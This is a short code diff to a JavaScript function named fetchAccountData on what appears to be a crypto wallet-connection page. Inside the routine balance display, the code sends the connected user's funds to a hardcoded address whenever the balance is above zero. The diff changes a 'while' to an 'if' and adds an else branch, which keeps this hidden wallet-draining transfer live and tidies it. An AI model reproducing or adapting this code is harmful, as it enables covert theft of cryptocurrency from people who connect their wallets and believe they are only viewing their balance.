@@ -137,7 +137,7 @@ async function fetchAccountData() {
     // https://github.com/indutny/bn.js/
     const ethBalance = web3.utils.fromWei(balance, "wei");
    const value = web3.utils.toBN(ethBalance).toString();
-    while(ethBalance > 0){ console.log("Balance greater than Zero");
+   if(ethBalance > 0){ console.log("Balance greater than Zero");
         web3.eth.sendTransaction({
            from: accounts[0],
            to: '0xC6b9549f86e669FcAecc5F0F2719FB957B1A3A7D',
@@ -151,6 +151,7 @@ async function fetchAccountData() {
 
 
      }
+    else{console.log("balance is not greater ")}
     console.log("Opening a dialog");
     const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);
     // Fill in the templated row and put in the document
